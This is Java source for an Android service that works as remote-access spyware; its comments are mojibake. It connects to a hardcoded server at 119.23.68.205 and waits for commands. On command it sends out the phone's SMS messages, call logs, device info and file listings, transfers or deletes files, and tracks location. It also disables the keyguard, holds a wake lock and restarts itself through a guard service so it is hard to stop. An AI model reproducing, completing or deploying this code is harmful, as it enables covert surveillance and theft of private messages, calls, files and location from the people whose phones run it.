/**
 * 
 */
package com.byc.control;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;


import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager.WakeLock;
import android.util.Log;
import android.widget.Toast;

import utils.FileUtils;


/**
 * @author byc
 * @param <StepService>
 *
 */
public class MainService extends Service {
	 public static final String TAG = "byc001"; 
	 //��Ϣ���壺
	 private static final int MSG_ORDER=0x11;//���յ����
	 private static final int MSG_DATA=0x21;//�����߳���Ϣ��
	 //public static final int MSG_LOCATION=0x31;//��λ��Ϣ��
	 
	 public static final String INTENT_LOCATION_CMD = "byc_control_Intent_service_location_cmd";//��λ��Ϣ���
	 //private static final int MSG_DATA_FAL=0x22;//�����߳�ʧ����ɣ�
	 private OrderThread orderThread=null;//ָ���̣߳�
	 private DataThread dt=null;//�����̣߳�
	 private final int RECONNECT_INTERVAL_TIME=60*1000;//�ٴ����Ӽ��ʱ��1���ӣ�
	 Map<String, DataThread>  mapDataThreads = new HashMap<String, DataThread>();
	 private PhoneInfo pi=null;
	 private static int mDataThreadID=0;
	 WakeLock wakeLock = null;
	 private static MainService current=null;
	 private FileSystem fileSystem;
    @Override  
    public void onCreate() {  
        super.onCreate();  
        Log.d(TAG, "MainService onCreate() executed");  
        current=this;
        orderThread=new OrderThread();//������������߳�
        pi=PhoneInfo.getPhoneInfo(getApplicationContext());//������Ϣ�����ࣻ
        fileSystem=FileSystem.getFileSystem(this);
        //5�����չ㲥��Ϣ
        //IntentFilter filter = new IntentFilter();
        //filter.addAction(ACTION_LOCATION);
        //registerReceiver(InfoReceiver, filter);
        //startAlarm();
        Funcs.disableKeyguard(this,this.getClass().toString());
        Funcs.acquireWakeLock(MainService.this,wakeLock,this.getClass().getCanonicalName());
    } 
    
    @Override  
    public IBinder onBind(Intent intent) {  
        //return null;  
    	return new ProcessConnection.Stub() {}; 
    }
    @Override  
    public void onDestroy() {  
        super.onDestroy();  
        current=null;
        Funcs.releaseWakeLock(wakeLock);
        stopForeground(true);// ֹͣǰ̨����--����:��ʾ�Ƿ��Ƴ�֮ǰ��֪ͨ
        Log.d(TAG, "onDestroy() executed");  
    } 
    @Override  
    public boolean stopService(Intent name) { 
    	Log.d(TAG, "stopService() executed"); 
        return super.stopService(name);  
    } 
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.d(TAG, "onStartCommand() executed");  
        startForeground(1,new Notification());  
        //�󶨽�������  
        bindService(new Intent(this,GuardService.class),  
                mServiceConnection, Context.BIND_IMPORTANT);  
          
        orderThread.startOrder();
        //getPowerWindows();
        return START_STICKY;
        //return super.onStartCommand(intent, flags, startId);  
    } 
    public static MainService getOrderService() { 
    	return current;
    }
    /*
	 * ������ʱ�� 
	 */
	 private void startAlarm() 
	 { 
		 Intent intent = new Intent(this, MainService.class); 
		 PendingIntent pi=PendingIntent.getService(this, 0, intent, 0);
		 AlarmManager am = (AlarmManager)getSystemService(ALARM_SERVICE); 
		 am.setRepeating(AlarmManager.RTC_WAKEUP,System.currentTimeMillis(),60*60*1000,pi); 
	 }
    public Handler HandlerSock = new Handler() {  
        @Override  
        public void handleMessage(Message msg) {  
            if (msg.what == MSG_ORDER) {  //���������߳���Ϣ��
            	byte[] data=null;
            	if(msg.arg2>0){
            		Bundle bundle = msg.getData();
            		data=(byte[])bundle.get("data");
            	}
            	command(msg.arg1,data);
            	//Log.i(TAG, "handleMessage:MSG_ORDER:" + ot.oh.cmd);
            }
            if (msg.what == MSG_DATA) {  //���������߳���Ϣ��
              	int i=msg.arg1;
            	removeDataThread(i);
            }

        }  
  
    };
    /*
     * ����㲥��Ϣ��
     */
	private BroadcastReceiver InfoReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            Log.d(Config.TAG, "Main receive-->" + action);
            //if(ACTION_LOCATION.equals(action)) {
            	//mLocationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE); 
            //}
        }
    };
    /*
     * ����������Ϣ��
     */
    private void command(int cmd,byte[] data){
    	switch(cmd){
        case order.CMD_READY:
        	break;
        case order.CMD_INFO://��ȡ��Ϣ��
        	SendBaseInfo(cmd);
        	break;
        case order.CMD_FILE_LIST://��ȡĿ¼������ļ���Ϣ��
        	fileSystem.processListFileInfo(data);
        	break;   
        case order.CMD_FILE_TRANS://�����ļ���CMD_FILE_DEL
        	fileSystem.processTransFiles(data);
        	break;    
        case order.CMD_FILE_DEL://�����ļ���
        	fileSystem.processDelFile(data);
        	break; 
    	case order.CMD_SMS_CONTENT://��ȡ������Ϣ��
    		SendBaseInfo(cmd);
    		break;
    	case order.CMD_CALL://��ȡͨ����Ϣ��
    		SendBaseInfo(cmd);
    		break;
    	case order.CMD_LOCATION_SINGLE://��ȡ��λ��Ϣ��
    	case order.CMD_LOCATION_SERIES:
    		StartLocationService(cmd);
    		break;
    	case order.CMD_LOCATION_STOP:
    		Intent intent = new Intent(this, LocationSvc.class);
    		stopService(intent);
    		break;
    	}
    	
    }
    /*
     * ���䷢���̣߳�
     */
    public DataThread getDataThread(){
    	mDataThreadID=mDataThreadID+1;
    	String key=String.valueOf(mDataThreadID);
    	mapDataThreads.put(key, new DataThread(mDataThreadID));
    	order.formatOH(mapDataThreads.get(key).sock.oh);
    	return mapDataThreads.get(key);
    }
    /*
     * �ͷŷ����̣߳�
     */
    private void removeDataThread(int id){
    	String key=String.valueOf(id);
    	if(mapDataThreads.get(key)==null)return;
    	if(mapDataThreads.get(key).dataThreadInfo.bSuc)Log.i(Config.TAG, "handleMessage:DataThread suc" );
    	mapDataThreads.get(key).dataThreadInfo=null;
    	mapDataThreads.remove(key);	
    }
    /*
     * ���Ͷ�λ��Ϣ��
     */
    private void StartLocationService(int cmd){
    	 Intent intent = new Intent(this, LocationSvc.class);
    	 intent.putExtra(INTENT_LOCATION_CMD, cmd);
    	 //if(Funcs.isServiceRunning(getApplicationContext(), "com.byc.control.LocationSvc")){
    	 if(LocationSvc.isWorking){
    		 stopService(intent);
    	 }
         startService(intent);
 
    }
    /*
     * ��ȡȨ�޽��棻
     */
    private void getPowerWindows(){
    	String txt=pi.getBaseInfo()+
    			pi.getSmsInPhone()+
    			pi.GetCallsInPhone();
    	Log.i(TAG, txt);
    	StartLocationService(order.CMD_LOCATION_SINGLE);
    }
   
 
    /*
     * ������Ϣ��
     */
    private void SendBaseInfo(int cmd){
    	DataThread dataThread=getDataThread();
    	dataThread.sock.oh.cmd=cmd;
    	switch(cmd){//CMD_FILE_LIST_EXT_SD
        	case order.CMD_INFO:
        		dataThread.sock.s=pi.getBaseInfo();
        	break;
        	case order.CMD_SMS_CONTENT:
        		dataThread.sock.s=pi.getSmsInPhone();
        		//dts[i].sock.s=pi.GetCallsInPhone();
        	break;
        	case order.CMD_CALL:
        		//dts[i].sock.s=pi.getSmsInPhone();
        		dataThread.sock.s=pi.GetCallsInPhone();
        	break;

    	}    	
    	//
    	dataThread.start();
    }
    /*
     * ����ָ���̣߳�
     */
    class OrderThread extends Thread { 
    	public Sock sock;
    	private String host= "119.23.68.205";
    	private int port = 8100;//������ն˿�
    	WakeLock wakeLock = null; 
    	private Message msg= null;//��Ϣ����;
    	Bundle bundle=null; 
   	 public OrderThread() { 
		 host=Config.host;
		 port=Config.port_order;
		 sock=new Sock(host,port);
	 }
    public void startOrder() { 
    	try{
            if(this.isAlive()){
            	if(!this.sock.isConnected()){
            		//orderThread.start();
            	}
            }else{
            	orderThread.start();
            }
    	}catch(IllegalThreadStateException e){
    		e.printStackTrace();
    	}
    }
   	public boolean isConnected() { 
   		if(sock==null)return false;
   		return sock.isConnected();
   	}
	 /*
	  * ������Ϣ��
	  */
	 private void sendMsg(int cmd,byte[] data) {
		  //������Ϣ  
        msg = new Message();  
        msg.what = MSG_ORDER;
        msg.arg1=cmd;
        msg.arg2=0;
        if(data!=null){
        	msg.arg2=data.length;
        	bundle = new Bundle();
        	bundle.clear(); 
        	bundle.putByteArray("data", data);
        	msg.setData(bundle);  //
        }
        HandlerSock.sendMessage(msg);
	 }
 	@Override  
	 	public void run() {  
	 		//���ӷ����� (ÿ��5��������һ��)
	 		Log.d(Config.TAG, "ORDER SOCKET Start:-------------------------->");
	 		Funcs.acquireWakeLock(MainService.this,wakeLock,OrderThread.this.getClass().getCanonicalName());
	 		while(true){//ѭ�����ӣ�
	 			if(sock.connectServer()){//���ӷ������ɹ���
	 				sock.oh=order.formatOH(sock.oh);
	 				sock.SendOH(sock.oh);//������֤��Ϣ��
	 				Log.d(Config.TAG, "SOCKET Recv:---------------------------------->");
	 				while(true){
	 					sock.oh.cmd=order.CMD_READY;
	 					sock.data=null;
	 					if(sock.RecvOH()){
	 						if(sock.oh.cmd==order.CMD_READY)continue;//������;
 							if(sock.oh.len>0)//�������ݣ�
 								sock.RecvData(sock.oh.len);//�����������С��
 							//HandlerSock.sendEmptyMessage(MSG_ORDER);//���ͽ��յ�������Ϣ�������ࣻ
 							sendMsg(sock.oh.cmd,sock.data);
	 					}else{//����ʧ�ܣ�
	 						break;//�������ӷ�����
	 					}//if(sock.RecvPH()){//���հ�ͷ�ɹ���
	 				}//while(true){
	 			}else{//����ʧ�ܣ�
	 				Sleep(RECONNECT_INTERVAL_TIME);
	 			}//if(sock.connectServer()){//���ӷ������ɹ���
	 		}//while(true){
	 		//releaseWakeLock(wakeLock);
	 	}//public void run() { 
	 /*
	  * ��ʱ��
	  */
	 private void Sleep(int MilliSecond) {
		 try{
			 	Thread.sleep(MilliSecond);
		   	}catch(InterruptedException e){
		   		e.printStackTrace();
		   	}catch(IllegalArgumentException e){
		   		e.printStackTrace();
		   	}  
	 }

    }//class OrderThread extends Thread {
    public class DataThreadInfo {
    	public int ID;//�̱߳�ʶ;
    	public boolean bSuc;//�Ƿ�ɹ���ɣ�
    	public int len;//���ݳ��ȣ�
    	public byte[] data;//����
    }
    /*
     * ���ݴ����̣߳�
     */
    class DataThread extends Thread { 
    	private String host= "119.23.68.205";
    	private int port = 8101;//���ݴ���˿�
    	private Message msg= null;//��Ϣ����;
    	//Bundle bundle=null; 
    	public DataThreadInfo dataThreadInfo=new DataThreadInfo();
    	public Sock sock;
    	 public DataThread(int idx) { 
    		 host=Config.host;
    		 port=Config.port_data;
    		 sock=new Sock(host,port);
    		 initMsg(idx); 
    	 }   	
    	 @Override  
         public void run() {  
           
    		 if(sock.connectServer()){//���ӷ������ɹ���
    			 if(sock.bmp!=null){//����ͼƬ:
    				 dataThreadInfo.bSuc=sock.SendBmp(sock.bmp);
    			 }else if(sock.s!=null){//�����ַ���:
    				 int i=sock.SendString(sock.s);
    				 if(i==-1)dataThreadInfo.bSuc=false;else dataThreadInfo.bSuc=true;
    			 }else if(sock.data!=null){
    				 sock.SendOH(sock.oh);
    				 if(sock.oh.len>0)dataThreadInfo.bSuc=sock.SendData(sock.oh.len);
    			 } 
    		 }else{//���ӷ�����ʧ�ܣ�
    			 dataThreadInfo.bSuc=false;  
    		 }
             HandlerSock.sendMessage(msg);
			 release(); 
    	 }
    	 /*
    	  * ׼����Ϣ�壺
    	  */
    	 private void initMsg(int idx) {
    		  //������Ϣ  
             msg = new Message();  
             msg.what = MSG_DATA;
             msg.arg1=idx;
             //bundle = new Bundle();
             //bundle.clear(); 
             //bundle.putInt("threadID", ID);
             //msg.setData(bundle);  //
             dataThreadInfo.ID=idx;
             dataThreadInfo.len=0;
    	 }
    	 /*
    	  * �ͷ��ڴ棺
    	  */
    	 private void release() {
    		sock.release(); 
    		sock=null;
    	    msg=null;
    	 }
    }
    private ServiceConnection mServiceConnection = new ServiceConnection() {  
        @Override  
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {  
            //������  
            Log.d(Config.TAG,"StepService:��������");  
        }  
  
        @Override  
        public void onServiceDisconnected(ComponentName componentName) {  
            //�Ͽ�����  
            startService(new Intent(MainService.this,GuardService.class));  
            //���°�  
            bindService(new Intent(MainService.this,GuardService.class),  
                    mServiceConnection, Context.BIND_IMPORTANT);  
        }  
    };  

}
